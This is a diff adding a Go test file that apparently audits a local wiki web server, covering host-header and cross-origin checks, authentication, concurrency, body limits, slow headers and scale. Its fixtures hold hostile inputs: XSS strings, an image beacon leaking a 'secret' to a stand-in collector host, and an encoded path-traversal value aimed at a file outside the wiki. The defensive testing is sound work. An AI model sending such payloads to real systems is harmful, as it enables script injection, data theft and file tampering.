@@ -1,0 +1,437 @@
+package main
+
+import (
+	"bytes"
+	"crypto/sha256"
+	"encoding/json"
+	"fmt"
+	"github.com/neutrospec/canopy/internal/config"
+	"github.com/neutrospec/canopy/internal/reads"
+	"github.com/neutrospec/canopy/internal/tasks"
+	"github.com/neutrospec/canopy/internal/webui"
+	"io"
+	"net"
+	"net/http"
+	"net/http/httptest"
+	"net/url"
+	"os"
+	"path/filepath"
+	"runtime"
+	"sort"
+	"strings"
+	"sync"
+	"testing"
+	"time"
+)
+
+func fixture(t *testing.T, body string) (*webui.Server, *config.Wiki) {
+	t.Helper()
+	root := t.TempDir()
+	os.MkdirAll(filepath.Join(root, "concepts"), 0755)
+	page := "---\ntitle: Alpha\ntype: concept\ncreated: 2020-01-01\nupdated: 2020-01-01\ntags: [tool]\n---\n" + body
+	if err := os.WriteFile(filepath.Join(root, "concepts", "alpha.md"), []byte(page), 0644); err != nil {
+		t.Fatal(err)
+	}
+	w := &config.Wiki{Root: root, Cfg: config.Default()}
+	s, err := webui.NewServer(w, nil)
+	if err != nil {
+		t.Fatal(err)
+	}
+	return s, w
+}
+func req(h http.Handler, method, path, host, origin, body string) *httptest.ResponseRecorder {
+	r := httptest.NewRequest(method, path, strings.NewReader(body))
+	if host != "" {
+		r.Host = host
+	}
+	if origin != "" {
+		r.Header.Set("Origin", origin)
+	}
+	r.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+	rec := httptest.NewRecorder()
+	h.ServeHTTP(rec, r)
+	return rec
+}
+func TestBoundary(t *testing.T) {
+	s, w := fixture(t, "PRIVATE-CANARY\n")
+	h := s.Handler()
+	for _, p := range []string{"/page/alpha", "/api/preview/alpha", "/api/graph"} {
+		r := req(h, "GET", p, "evil.test:8737", "", "")
+		t.Logf("loopback host=evil.test path=%s status=%d private=%t", p, r.Code, strings.Contains(r.Body.String(), "PRIVATE-CANARY"))
+		if r.Code != 200 {
+			t.Fatal(r.Code)
+		}
+	}
+	for _, o := range []string{"https://evil.test", "null", "http://evil.test:8737", ""} {
+		r := req(h, "POST", "/task/edit/alpha", "evil.test:8737", o, "request=probe")
+		t.Logf("POST host=evil.test:8737 origin=%q status=%d", o, r.Code)
+	}
+	list, err := tasks.Load(w)
+	if err != nil {
+		t.Fatal(err)
+	}
+	t.Logf("accepted task mutations=%d", len(list))
+	t.Setenv("XDG_CONFIG_HOME", t.TempDir())
+	_, err = s.EnableAuth()
+	if err != nil {
+		t.Fatal(err)
+	}
+	r := req(h, "GET", "/api/graph", "evil.test:8737", "", "")
+	t.Logf("auth enabled unauth GET status=%d private=%t location=%s", r.Code, strings.Contains(r.Body.String(), "PRIVATE-CANARY"), r.Header().Get("Location"))
+}
+func TestRenderTrust(t *testing.T) {
+	payload := `<script>window.auditExecuted=true</script><img src="/probe-invalid" onerror="window.auditError=true">` + "\n\n" + `[go](javascript:alert%281%29)` + "\n\n" + `![pixel](https://collector.invalid/pixel?secret=fixture)` + "\n\n" + `[[alpha|<img src=x onerror=alert(1)>]]`
+	s, _ := fixture(t, payload)
+	r := req(s.Handler(), "GET", "/page/alpha", "localhost:8737", "", "")
+	t.Logf("status=%d script=%t eventhandler=%t javascriptURL=%t remoteImage=%t escapedAlias=%t CSP=%q", r.Code, strings.Contains(r.Body.String(), `<script>window.auditExecuted=true</script>`), strings.Contains(r.Body.String(), `onerror="window.auditError=true"`), strings.Contains(r.Body.String(), `href="javascript:`), strings.Contains(r.Body.String(), `https://collector.invalid/pixel?secret=fixture`), strings.Contains(r.Body.String(), `&lt;img src=x onerror=alert(1)&gt;`), r.Header().Get("Content-Security-Policy"))
+}
+func TestReadAndHomeMutations(t *testing.T) {
+	s, w := fixture(t, "Old isolated page\n")
+	h := s.Handler()
+	r := req(h, "POST", "/read/phantom", "localhost:8737", "http://localhost:8737", "action=read")
+	rs, err := reads.Load(w)
+	if err != nil {
+		t.Fatal(err)
+	}
+	t.Logf("explicit nonexistent status=%d recorded=%t", r.Code, rs.IsRead("phantom"))
+	r = req(h, "POST", "/api/read/phantom", "localhost:8737", "http://localhost:8737", "")
+	t.Logf("automatic nonexistent status=%d", r.Code)
+	r = req(h, "POST", "/resurface/feedback", "localhost:8737", "http://localhost:8737", "slug=phantom&action=up")
+	data, _ := os.ReadFile(filepath.Join(w.Root, "_meta", "resurface", "state.json"))
+	t.Logf("feedback nonexistent status=%d stored=%s", r.Code, string(data))
+	before, _ := os.ReadFile(filepath.Join(w.Root, "_meta", "resurface", "state.json"))
+	r = req(h, "HEAD", "/", "localhost:8737", "https://evil.test", "")
+	after, _ := os.ReadFile(filepath.Join(w.Root, "_meta", "resurface", "state.json"))
+	t.Logf("HEAD foreign-origin home status=%d stateChanged=%t", r.Code, !bytes.Equal(before, after))
+	r = req(h, "GET", "/", "localhost:8737", "", "")
+	t.Logf("home unreadOne=%t allReadMessage=%t", strings.Contains(r.Body.String(), `id="stat-unread">1</strong>`), strings.Contains(r.Body.String(), "전부 읽으셨습니다"))
+	t.Logf("home discover excerpt=%s", func() string {
+		b := r.Body.String()
+		i := strings.Index(b, `home_discover`)
+		if i < 0 {
+			i = strings.Index(b, "모두")
+		}
+		if i < 0 {
+			return "check locale string"
+		}
+		return b[i:min(len(b), i+120)]
+	}())
+}
+func TestAuthRedirectAndCookie(t *testing.T) {
+	s, w := fixture(t, "fixture\n")
+	t.Setenv("XDG_CONFIG_HOME", t.TempDir())
+	code, err := s.EnableAuth()
+	if err != nil {
+		t.Fatal(err)
+	}
+	h := s.Handler()
+	for _, body := range []string{"id=me&password=longenough", url.Values{"code": {code}, "id": {"me"}, "password": {"longenough"}}.Encode()} {
+		r := req(h, "POST", "/setup", "localhost:8737", "http://localhost:8737", body)
+		t.Logf("setup missingCode=%t status=%d cookies=%v", !strings.Contains(body, "code="), r.Code, r.Header().Values("Set-Cookie"))
+	}
+	ts := httptest.NewServer(h)
+	defer ts.Close()
+	r, err := http.Post(ts.URL+"/api/read/alpha", "application/x-www-form-urlencoded", strings.NewReader(""))
+	if err != nil {
+		t.Fatal(err)
+	}
+	defer r.Body.Close()
+	b, _ := io.ReadAll(r.Body)
+	rs, _ := reads.Load(w)
+	t.Logf("expired/absent session fetch finalStatus=%d URL=%s type=%q readStored=%t isLogin=%t", r.StatusCode, r.Request.URL.Path, r.Header.Get("Content-Type"), rs.IsRead("alpha"), strings.Contains(string(b), `action="/login"`))
+}
+func TestConcurrentProposals(t *testing.T) {
+	for round := 0; round < 3; round++ {
+		s, w := fixture(t, "original\n")
+		h := s.Handler()
+		const n = 24
+		start := make(chan struct{})
+		var wg sync.WaitGroup
+		codes := make(chan int, n)
+		for i := 0; i < n; i++ {
+			wg.Add(1)
+			go func(i int) {
+				defer wg.Done()
+				<-start
+				r := req(h, "POST", "/edit/alpha", "localhost:8737", "http://localhost:8737", url.Values{"body": {fmt.Sprintf("unique-proposal-%d", i)}}.Encode())
+				codes <- r.Code
+			}(i)
+		}
+		close(start)
+		wg.Wait()
+		close(codes)
+		ok := 0
+		for c := range codes {
+			if c == 303 {
+				ok++
+			}
+		}
+		list, err := tasks.Load(w)
+		t.Logf("round=%d submitted=%d success=%d persisted=%d loadError=%v", round, n, ok, len(list), err)
+	}
+}
+func TestConcurrentReadsAndFeedback(t *testing.T) {
+	s, w := fixture(t, "fixture\n")
+	h := s.Handler()
+	const n = 40
+	for i := 0; i < n; i++ {
+		content := fmt.Sprintf("---\ntitle: Slug %d\ntype: concept\n---\nValid fixture page\n", i)
+		if err := os.WriteFile(filepath.Join(w.Root, "concepts", fmt.Sprintf("slug-%d.md", i)), []byte(content), 0o644); err != nil {
+			t.Fatal(err)
+		}
+	}
+	var wg sync.WaitGroup
+	start := make(chan struct{})
+	codes := make(chan int, n)
+	for i := 0; i < n; i++ {
+		wg.Add(1)
+		go func(i int) {
+			defer wg.Done()
+			<-start
+			r := req(h, "POST", "/resurface/feedback", "localhost:8737", "http://localhost:8737", url.Values{"slug": {fmt.Sprintf("slug-%d", i)}, "action": {"up"}}.Encode())
+			codes <- r.Code
+		}(i)
+	}
+	close(start)
+	wg.Wait()
+	close(codes)
+	ok := 0
+	for c := range codes {
+		if c == 303 {
+			ok++
+		}
+	}
+	b, _ := os.ReadFile(filepath.Join(w.Root, "_meta", "resurface", "state.json"))
+	var data map[string]any
+	err := json.Unmarshal(b, &data)
+	persisted := 0
+	if a, ok := data["feedback"].([]any); ok {
+		persisted = len(a)
+	}
+	t.Logf("feedback validPageTargets=%d submitted=%d success=%d persisted=%d jsonError=%v state=%s", n, n, ok, persisted, err, string(b))
+}
+func TestBodyLimits(t *testing.T) {
+	s, w := fixture(t, "original\n")
+	h := s.Handler()
+	for _, size := range []int{1 << 20, 11 << 20} {
+		b := "body=" + strings.Repeat("a", size)
+		r := req(h, "POST", "/edit/alpha", "localhost:8737", "http://localhost:8737", b)
+		list, err := tasks.Load(w)
+		t.Logf("urlencoded bodyBytes=%d status=%d tasks=%d loadErr=%v errorBody=%q", len(b), r.Code, len(list), err, func() string {
+			if r.Code >= 400 {
+				return r.Body.String()
+			}
+			return ""
+		}())
+	}
+	boundary := "audit-boundary"
+	b := "--" + boundary + "\r\nContent-Disposition: form-data; name=\"body\"\r\n\r\n" + strings.Repeat("a", 11<<20) + "\r\n--" + boundary + "--\r\n"
+	r := httptest.NewRequest("POST", "/edit/alpha", strings.NewReader(b))
+	r.Host = "localhost:8737"
+	r.Header.Set("Content-Type", "multipart/form-data; boundary="+boundary)
+	rec := httptest.NewRecorder()
+	h.ServeHTTP(rec, r)
+	list, err := tasks.Load(w)
+	t.Logf("multipart bodyBytes=%d status=%d tasks=%d loadErr=%v", len(b), rec.Code, len(list), err)
+}
+func TestLoginDelay(t *testing.T) {
+	s, _ := fixture(t, "fixture\n")
+	t.Setenv("XDG_CONFIG_HOME", t.TempDir())
+	code, _ := s.EnableAuth()
+	h := s.Handler()
+	r := req(h, "POST", "/setup", "localhost:8737", "", url.Values{"code": {code}, "id": {"me"}, "password": {"longenough"}}.Encode())
+	if r.Code != 303 {
+		t.Fatal(r.Code)
+	}
+	start := time.Now()
+	r = req(h, "POST", "/login", "localhost:8737", "", "id=unknown&password=wrong")
+	t.Logf("first badID status=%d duration=%v", r.Code, time.Since(start))
+	start = time.Now()
+	r = req(h, "POST", "/login", "localhost:8737", "", "id=me&password=longenough")
+	t.Logf("legitimate after unrelated failure status=%d duration=%v", r.Code, time.Since(start))
+}
+func TestSlowHTTP(t *testing.T) {
+	s, _ := fixture(t, "fixture\n")
+	ts := httptest.NewUnstartedServer(s.Handler())
+	ts.Start()
+	defer ts.Close()
+	conn, err := net.Dial("tcp", ts.Listener.Addr().String())
+	if err != nil {
+		t.Fatal(err)
+	}
+	defer conn.Close()
+	fmt.Fprintf(conn, "GET /api/preview/alpha HTTP/1.1\r\nHost: localhost\r\nX-Slow: ")
+	time.Sleep(1500 * time.Millisecond)
+	fmt.Fprintf(conn, "complete\r\n\r\n")
+	conn.SetReadDeadline(time.Now().Add(time.Second))
+	buf := make([]byte, 300)
+	n, err := conn.Read(buf)
+	t.Logf("incomplete header held=1.5s completed status=%q err=%v readHeaderTimeout=%v readTimeout=%v", strings.Split(string(buf[:n]), "\r\n")[0], err, ts.Config.ReadHeaderTimeout, ts.Config.ReadTimeout)
+}
+func TestSearchCold(t *testing.T) {
+	s, _ := fixture(t, "unique-queryword text\n")
+	h := s.Handler()
+	r := req(h, "GET", "/api/search?q=unique-queryword", "localhost:8737", "", "")
+	t.Logf("cold autocomplete status=%d body=%s", r.Code, r.Body.String())
+	r = req(h, "GET", "/search?q=unique-queryword", "localhost:8737", "", "")
+	t.Logf("full search status=%d hit=%t", r.Code, strings.Contains(r.Body.String(), `href="/page/alpha"`))
+	r = req(h, "GET", "/api/search?q=unique-queryword", "localhost:8737", "", "")
+	t.Logf("warm autocomplete status=%d body=%s", r.Code, r.Body.String())
+}
+
+func TestCancelTraversal(t *testing.T) {
+	s, w := fixture(t, "fixture\n")
+	victim := filepath.Join(filepath.Dir(w.Root), "outside-task.json")
+	before := []byte(`{"version":1,"id":"victim","type":"edit","status":"pending","request":"outside wiki","secret":"fixture-only"}`)
+	if err := os.WriteFile(victim, before, 0600); err != nil {
+		t.Fatal(err)
+	}
+	t.Cleanup(func() { os.Remove(victim) })
+	r := req(s.Handler(), "POST", "/task/cancel/..%2f..%2f..%2foutside-task", "localhost:8737", "http://localhost:8737", "")
+	after, _ := os.ReadFile(victim)
+	t.Logf("encoded traversal status=%d location=%s outsideChanged=%t outsideBody=%s", r.Code, r.Header().Get("Location"), !bytes.Equal(before, after), after)
+}
+func TestWikiScale(t *testing.T) {
+	for _, n := range []int{100, 1000, 5000} {
+		s, w := fixture(t, "unique-queryword original\n")
+		for i := 1; i < n; i++ {
+			slug := fmt.Sprintf("page-%05d", i)
+			body := "---\ntitle: " + slug + "\ntype: concept\ncreated: 2020-01-01\nupdated: 2020-01-01\ntags: [tool]\n---\n" + strings.Repeat("fixture-text ", 320) + "\n[[alpha]]\n"
+			if err := os.WriteFile(filepath.Join(w.Root, "concepts", slug+".md"), []byte(body), 0644); err != nil {
+				t.Fatal(err)
+			}
+		}
+		h := s.Handler()
+		for _, p := range []string{"/api/preview/alpha", "/api/search?q=fixture", "/browse", "/api/graph", "/"} {
+			var ds []time.Duration
+			var allocs []uint64
+			out := 0
+			for j := 0; j < 3; j++ {
+				var a, b runtime.MemStats
+				runtime.ReadMemStats(&a)
+				start := time.Now()
+				r := req(h, "GET", p, "localhost:8737", "", "")
+				ds = append(ds, time.Since(start))
+				runtime.ReadMemStats(&b)
+				allocs = append(allocs, b.TotalAlloc-a.TotalAlloc)
+				out = r.Body.Len()
+				if r.Code != 200 {
+					t.Fatal(r.Code, r.Body.String())
+				}
+			}
+			sort.Slice(ds, func(i, j int) bool { return ds[i] < ds[j] })
+			sort.Slice(allocs, func(i, j int) bool { return allocs[i] < allocs[j] })
+			t.Logf("pages=%d path=%s median=%v allocatedBytes=%d responseBytes=%d", n, p, ds[1], allocs[1], out)
+		}
+	}
+}
+func TestConcurrentReadServing(t *testing.T) {
+	s, w := fixture(t, "fixture\n")
+	h := s.Handler()
+	req(h, "POST", "/read/alpha", "localhost:8737", "", "action=read")
+	var wg sync.WaitGroup
+	start := make(chan struct{})
+	codes := make(chan int, 320)
+	wg.Add(1)
+	go func() {
+		defer wg.Done()
+		<-start
+		for i := 0; i < 150; i++ {
+			req(h, "POST", "/read/alpha", "localhost:8737", "", "action=read")
+		}
+	}()
+	for i := 0; i < 8; i++ {
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			<-start
+			for j := 0; j < 40; j++ {
+				r := req(h, "GET", "/api/graph", "localhost:8737", "", "")
+				codes <- r.Code
+			}
+		}()
+	}
+	close(start)
+	wg.Wait()
+	close(codes)
+	ok, bad := 0, 0
+	for c := range codes {
+		if c == 200 {
+			ok++
+		} else {
+			bad++
+		}
+	}
+	rs, err := reads.Load(w)
+	count := 0
+	if err == nil && rs.Get("alpha") != nil {
+		count = rs.Get("alpha").Count
+	}
+	t.Logf("concurrent GET graph total=320 ok=%d errors=%d finalReadCount=%d finalReadErr=%v", ok, bad, count, err)
+}
+func TestStaleProposalBase(t *testing.T) {
+	s, w := fixture(t, "old body\n")
+	h := s.Handler()
+	form := req(h, "GET", "/edit/alpha", "localhost:8737", "", "")
+	file := filepath.Join(w.Root, "concepts", "alpha.md")
+	before, _ := os.ReadFile(file)
+	after := bytes.ReplaceAll(before, []byte("old body"), []byte("new agent body"))
+	if err := os.WriteFile(file, after, 0644); err != nil {
+		t.Fatal(err)
+	}
+	r := req(h, "POST", "/edit/alpha", "localhost:8737", "", url.Values{"body": {"old body with typo fixed\n"}}.Encode())
+	list, err := tasks.Load(w)
+	if err != nil || len(list) != 1 {
+		t.Fatal(err, len(list))
+	}
+	t.Logf("formOldBody=%t submission=%d storedOldProposal=%t baseMatchesNewFile=%t pageUnchangedAfterSubmit=%t", strings.Contains(form.Body.String(), "old body"), r.Code, strings.Contains(list[0].Body, "old body"), list[0].Base == fmt.Sprintf("%x", sha256.Sum256(after)), func() bool { v, _ := os.ReadFile(file); return bytes.Equal(v, after) }())
+}
+
+func TestUnauthMultipartSpool(t *testing.T) {
+	s, _ := fixture(t, "fixture\n")
+	t.Setenv("XDG_CONFIG_HOME", t.TempDir())
+	tmp := t.TempDir()
+	t.Setenv("TMPDIR", tmp)
+	if _, err := s.EnableAuth(); err != nil {
+		t.Fatal(err)
+	}
+	boundary := "audit-boundary"
+	prefix := "--" + boundary + "\r\nContent-Disposition: form-data; name=\"upload\"; filename=\"fixture.bin\"\r\nContent-Type: application/octet-stream\r\n\r\n"
+	suffix := "\r\n--" + boundary + "--\r\n"
+	r := httptest.NewRequest("POST", "/setup", io.MultiReader(strings.NewReader(prefix), strings.NewReader(strings.Repeat("z", 64<<20)), strings.NewReader(suffix)))
+	r.Header.Set("Content-Type", "multipart/form-data; boundary="+boundary)
+	rec := httptest.NewRecorder()
+	s.Handler().ServeHTTP(rec, r)
+	var total int64
+	entries, _ := os.ReadDir(tmp)
+	for _, e := range entries {
+		if st, err := e.Info(); err == nil {
+			total += st.Size()
+		}
+	}
+	t.Logf("unauth setup suppliedFileBytes=%d status=%d tempfileCount=%d spooledBytes=%d", 64<<20, rec.Code, len(entries), total)
+	if r.MultipartForm != nil {
+		r.MultipartForm.RemoveAll()
+	}
+}
+
+func TestLoopbackLogoutWithOldCookie(t *testing.T) {
+	s, w := fixture(t, "fixture\n")
+	t.Setenv("XDG_CONFIG_HOME", t.TempDir())
+	code, err := s.EnableAuth()
+	if err != nil {
+		t.Fatal(err)
+	}
+	setup := req(s.Handler(), "POST", "/setup", "localhost:8737", "", url.Values{"code": {code}, "id": {"me"}, "password": {"longenough"}}.Encode())
+	cookie := setup.Result().Cookies()[0]
+	loopback, err := webui.NewServer(w, nil)
+	if err != nil {
+		t.Fatal(err)
+	}
+	r := httptest.NewRequest("POST", "/logout", nil)
+	r.AddCookie(cookie)
+	rec := httptest.NewRecorder()
+	var panicValue any
+	func() { defer func() { panicValue = recover() }(); loopback.Handler().ServeHTTP(rec, r) }()
+	t.Logf("oldCookiePresent=%t loopbackLogoutPanicked=%t panic=%v", cookie.Value != "", panicValue != nil, panicValue)
+}
